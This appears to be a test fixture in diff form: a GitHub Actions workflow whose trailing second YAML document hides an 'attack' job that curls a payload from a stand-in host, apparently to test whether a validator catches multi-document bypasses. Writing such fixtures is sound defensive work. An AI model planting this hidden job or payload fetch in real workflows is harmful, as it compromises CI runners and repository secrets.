@@ -1,0 +1,8 @@
+name: Second document bypass
+on: pull_request
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+--- {jobs: {attack: {runs-on: ubuntu-latest, steps: [{run: curl https://example.invalid/payload}]}}}
